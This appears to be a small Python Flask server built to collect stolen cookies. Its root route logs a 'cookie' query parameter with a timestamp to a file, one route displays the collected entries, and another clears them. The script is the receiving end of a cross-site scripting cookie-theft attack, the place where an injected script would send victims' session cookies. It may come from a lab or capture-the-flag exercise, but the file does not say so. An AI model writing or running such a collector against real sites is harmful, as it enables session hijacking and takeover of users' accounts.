from flask import Flask, request
from waitress import serve
import time,datetime
port = 667
host = "0.0.0.0",
def init():
    with open("request.txt", "w") as f:
        f.write("")
    f.close()


app = Flask(__name__)



@app.route('/')
def get_cookie():
    timestamp = time.time()
    value = datetime.datetime.fromtimestamp(timestamp)
    cookie_value = value.strftime('%Y-%m-%d %H:%M:%S') + ":\t" + request.args.get('cookie')
    with open("request.txt", "a") as f:
        f.write(cookie_value+"\n")
    f.close()

    return cookie_value

@app.route('/request')
def get_request():
    print("get request")
    content = ""
    with open("request.txt", "r") as f:
        for line in f:
            content += line + "<br>" 
    f.close()
    print(content)
    return content

@app.route('/clear', methods=['DELETE'])
def clear_request():
    with open("request.txt", "w") as f:
        f.write("")
    f.close()
    return "OK"

if __name__ == '__main__':
    init()
    #serve(app, host=host, port=port)
    app.run( port=port)


